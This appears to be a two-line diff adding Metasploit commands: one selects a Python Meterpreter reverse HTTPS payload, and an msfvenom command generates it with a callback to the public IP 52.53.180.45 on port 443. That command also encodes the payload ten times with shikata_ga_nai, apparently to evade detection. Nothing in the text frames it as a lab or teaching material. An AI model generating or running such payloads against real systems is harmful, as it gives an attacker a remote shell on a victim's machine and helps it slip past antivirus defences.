@@ -1,0 +1,2 @@
+use payload python/meterpreter_reverse_https
+msfvenom -p python/meterpreter_reverse_https LHOST=52.53.180.45 LPORT=443 -e x86/shikata_ga_nai -i 10 -f python
